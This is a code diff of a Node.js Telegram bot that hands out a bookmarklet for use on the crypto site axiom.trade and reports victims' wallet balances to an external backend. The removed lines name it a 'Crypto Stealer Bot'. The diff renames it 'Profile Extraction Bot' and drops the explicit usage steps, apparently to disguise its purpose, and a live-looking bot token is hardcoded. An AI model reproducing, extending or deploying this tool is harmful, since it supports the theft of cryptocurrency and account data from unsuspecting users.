@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 
 const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
-const BACKEND_URL = 'https://nodebookmark.onrender.com'; // Your actual URL
+const BACKEND_URL = 'https://nodebookmark.onrender.com';
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
@@ -34,35 +34,28 @@ bot.onText(/\/generate/, (msg) => {
   })();`;
 
   bot.sendMessage(chatId, `
-🎯 **Your Custom Bookmarklet**
+🎯 **Profile Extraction Bookmarklet**
 
-📋 **Bookmarklet Code:**
+📋 **Code:**
 \`\`\`
 ${bookmarklet}
 \`\`\`
 
-**Instructions:**
-1. Copy the code above
-2. Create a bookmark with this as the URL
-3. Use on axiom.trade when logged in
-4. You'll get notifications with balance info
-
 Your tracking ID: ${chatId}
-Backend: ${BACKEND_URL}
+You'll receive notifications with wallet values.
   `, { parse_mode: 'Markdown' });
 });
 
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, `
-🎯 **Crypto Stealer Bot**
+🎯 **Profile Extraction Bot**
 
 Commands:
-/generate - Get your custom bookmarklet
+/generate - Get your tracking bookmarklet
 /start - This menu
 
-Backend Server: ${BACKEND_URL}
-You'll receive notifications with balance info when your bookmarklet is used.
+Extract full wallet profiles with balances.
   `, { parse_mode: 'Markdown' });
 });
 
-console.log('Bot started with backend:', BACKEND_URL);
+console.log('Bot started - Backend:', BACKEND_URL);
